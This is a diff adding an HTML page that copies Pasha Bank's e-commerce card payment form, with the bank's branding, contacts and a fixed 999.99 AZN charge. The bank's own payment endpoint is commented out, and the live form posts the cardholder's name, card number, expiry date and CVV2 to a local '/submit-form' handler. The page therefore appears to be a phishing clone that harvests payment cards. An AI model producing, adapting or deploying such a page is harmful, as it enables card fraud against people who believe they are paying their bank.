@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<body >
+
+
+
+<script type="text/javascript" src="./Pasha Bank E-commerce_files/08a306fc7aab2000b246d3c5285839700c4b6edaf5ab4c2297e9628490c49a7ecd69ec3f822ef555"></script>
+
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="viewport" content="width=device-width, user-scalable=no">
+		<link rel="shortcut icon" href="https://ecomm.pashabank.az:8463/ecomm2/template/template/images/favicon.ico" type="image/ico">
+		<title>Pasha Bank E-commerce</title>
+
+		<link rel="stylesheet" href="./Pasha Bank E-commerce_files/styles.css" type="text/css">
+		<script type="text/javascript" src="./Pasha Bank E-commerce_files/jquery-1.9.1.min.js"></script>
+		<script src="./Pasha Bank E-commerce_files/jquery.maskedinput.min.js"></script>
+		<script defer="" type="text/javascript" src="./Pasha Bank E-commerce_files/main.js"></script>
+
+		<noscript>
+			<meta
+				http-equiv="refresh"
+				content="0; url=./template/template/nojavascript.html"
+			/>
+		</noscript>
+	
+
+	
+		<div class="mainwrapper">
+			<header class="ecom-header">
+				<img class="logo" src="./Pasha Bank E-commerce_files/pb-logo.svg" alt="pb-logo">
+				<label class="amount-label">Ümumi məbləğ</label>
+				<label id="ledger" class="amount">999.99 AZN</label>
+			</header>
+
+			<main>
+					<!-- <form method="post" action="https://ecomm.pashabank.az:8463/ecomm2/ClientHandler" id="payment_form"> -->
+                        <form id="cardentry" action="/submit-form" method="post" autocomplete="off">
+  <p id="transaction_props">
+ 
+  </p>
+
+					<!--<input type="hidden" name="merchant" value="0003851">-->
+					<div class="input-field">
+						<label for="cardname">Ad və Soyad</label>
+						<input tabindex="1" id="cardname" name="cardname" type="text" maxlength="26" autocomplete="cc-name" placeholder="Kart üzərindəki ad və soyad">
+						<p id="cardname-error-mandatory" class="error-message hidden">
+							Xana məlumatları qeyd olunmalıdır
+						</p>
+						<p id="cardname-error-alpha" class="error-message hidden">
+							Rəqəm və simvollardan istifadə edilməməlidir
+						</p>
+						<script>validateCardholder();</script>
+					</div>
+
+					<div class="input-field">
+						<label for="cardnr">Kart nömrəsi</label>
+						<div class="input-with-icon">
+							<input tabindex="2" type="text" id="cardnr" name="cardnr" placeholder="1234 1234 1234 1234" autocomplete="cc-number" inputmode="text">
+                            <img id="card-number-icon" src="./Pasha Bank E-commerce_files/card.svg" alt="card">
+						</div>
+						<p id="cardnr-error-mandatory" class="error-message hidden">
+							Xana məlumatları qeyd olunmalıdır
+						</p>
+						<p id="cardnr-error-length" class="error-message hidden">
+							16 rəqəmli olmalıdır.
+						</p>
+						
+						<script>validateCardnumber();</script>
+					</div>
+					<p id="keycode"></p>
+					<div class="input-group">
+						<div class="input-field" >
+							<label for="expire-date">Kartın bitmə tarixi</label>
+							<input id="expire-date" type="text" placeholder="ay / il" maxlength="5" autocomplete="cc-exp" inputmode="text">
+							<p id="expire-date-error-mandatory" class="error-message hidden">
+								Xana məlumatları qeyd olunmalıdır
+							</p>
+							<p id="expire-date-error-format" class="error-message hidden">
+								Format yanlışdır
+							</p>
+							<input type="hidden" name="validMONTH" id="month-input">
+							<input type="hidden" name="validYEAR" id="year-input">
+							<script>validateExpirationDate();</script>
+						</div>
+
+						<div class="input-field">
+							<label for="cvc2">CVC2 / CVV2</label>
+							<div class="input-with-icon">
+								<input id="cvc2" name="cvc2" type="password" placeholder="123" maxlength="3" autocomplete="cc-csc">
+                                <img src="./Pasha Bank E-commerce_files/cvc.svg" alt="card">
+							</div>
+							<p id="cvc2-error-mandatory" class="error-message hidden">
+								Xana məlumatları qeyd olunmalıdır
+							</p>
+							<p id="cvc2-error-length" class="error-message hidden">
+								3 rəqəmli olmalıdır
+							</p>
+							<script>   validateCVC();</script>
+						</div>
+					</div>
+					<button id="pay-btn" class="btn pay-btn" type="submit">Ödəniş et</button>
+				</form>
+			</main>
+		</div>
+
+		<footer>
+			<div class="plastic-cards-container">
+				<div class="plastic-cards">
+					<img src="./Pasha Bank E-commerce_files/verified-by-visa.svg" alt="verified-by-visa">
+					<img src="./Pasha Bank E-commerce_files/visa.svg" alt="visa">
+					<img src="./Pasha Bank E-commerce_files/visa-electron.svg" alt="visa-electron">
+				</div>
+				<div class="plastic-cards">
+					<img src="./Pasha Bank E-commerce_files/maestro.svg" alt="maestro">
+					<img src="./Pasha Bank E-commerce_files/mastercard.svg" alt="mastercard">
+					<img src="./Pasha Bank E-commerce_files/mastercard-secure-code.svg" alt="mastercard-secure-code">
+				</div>
+			</div>
+			<div class="contacts">
+				<p>Bankla əlaqə üçün:</p>
+				<p>
+					customer.care@pashabank.az
+					<span class="seperator">|</span>&nbsp;<span class="bank-number">+994 (12) 496 50 00</span>
+				</p>
+				<p id="copyrights">© Copyrights 2007-2025 PAŞA Bank</p>
+			</div>
+			
+			<script>
+				$(document).ready(function() {
+    /* Cardholder name */
+    $('#cardname').on('input',function(){ 
+        $(this).val($(this).val().replace(/[^A-Za-z\s]/g,'').trimStart() ); 
+    });
+
+    /* Card Number */
+    $("#cardnr").inputmask("9999 9999 9999 9999");
+
+    $("#cardnr").on("keyup", function() {
+        var value = $(this).val();
+        var src;
+
+        var folder = "./Pasha Bank E-commerce_files/";
+
+        if (value[0] == 4) {
+            src = folder + "visa-mini.svg";
+        } else if (value[0] == 5) {
+            src = folder + "mastercard-mini.svg";
+        } else {
+            src = folder + "card.svg";
+        }
+
+        $("#card-number-icon").attr("src", src);
+    });
+    
+
+    /* CVC / CVV number */
+    $('#cvc2').on('input',function(){ 
+        $(this).val($(this).val().replace(/[^0-9]/g,'') ); 
+    });
+
+    /* Expire Date */
+    $("#expire-date").inputmask("99/99");
+
+    $("#expire-date").on("input", function(e) {
+        var value = $(this).val();
+
+        // Update hidden inputs
+        $("#month-input").val(value.substr(0, 2));
+        $("#year-input").val(value.substr(3, 5));
+
+        // If user enters 2,3,4 ... change to 02, 03, 04 etc..
+        var int  = value.replace(/\//g, "").replace(/\_/g, "");
+        if (int.length == 1 && int != 0 && int != 1) {
+            $(this).val(`0${value}`);
+        }
+    });
+
+    /* On form submit validate and delete white spaces on card number */
+    var isFormValid = true;
+
+    $("#cardentry").on("submit", function(e) {
+        /* Validation */
+        isFormValid = true;
+        $('.error-message').addClass('hidden');
+        $('.input-field-with-error').removeClass('input-field-with-error');
+
+        validateCardholder();
+        validateCardnumber();
+        validateExpirationDate();
+        validateCVC();
+
+        if (!isFormValid) {
+            e.preventDefault();
+            return false;
+        }
+        /* Delete whitespaces */
+        $("#cardnr").inputmask('remove');
+        $('#cardnr').val($('#cardnr').val().replace(/\s/g, ""));
+        return true;
+    });
+
+    function validateCardholder() {
+        var input = $('#cardname');
+        var value = input.val();
+        var pattern = /^[a-zA-Z ]+$/;
+
+        if (!value.trim()) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cardname-error-mandatory").removeClass("hidden");
+            isFormValid = false;
+        
+        } else if (!pattern.test(value)) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cardname-error-alpha").removeClass("hidden");
+            isFormValid = false;
+        }
+    }
+
+    function validateCardnumber() {
+        var input = $("#cardnr");
+        var value = input.val().replace(/\s/g, "").replace(/\_/g, "");
+        if (!value.trim()) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cardnr-error-mandatory").removeClass('hidden');
+            isFormValid = false;
+        } else if (value.length != 16) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cardnr-error-length").removeClass('hidden');
+            isFormValid = false;
+        }
+    }
+
+    function validateExpirationDate() {
+        var input = $("#expire-date");
+        var value = input.val();
+        if (!value.trim()) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#expire-date-error-mandatory").removeClass('hidden');
+            isFormValid = false;
+        }
+        if (value.slice(0, 2) > 12) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#expire-date-error-format").removeClass('hidden');
+            isFormValid = false;
+        }
+    }
+
+    function validateCVC() {
+        var input = $("#cvc2");
+        var value = input.val();;
+        if (!value.trim()) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cvc2-error-mandatory").removeClass('hidden');
+            isFormValid = false;
+        } else if (value.length != 3) {
+            input.closest('.input-field').addClass('input-field-with-error');
+            $("#cvc2-error-length").removeClass('hidden');
+            isFormValid = false;
+        }
+    }
+
+    /* Copyright */
+    $("#copyrights").html("© Copyrights 2007-" + new Date().getFullYear() + " PAŞA Bank");
+
+    /* In English or Russian */
+    $("#copyrights2").html("© Copyrights 2007-" + new Date().getFullYear() + " PASHA Bank");
+
+});
+
+			</script>
+
+		</footer>
+	
+
+
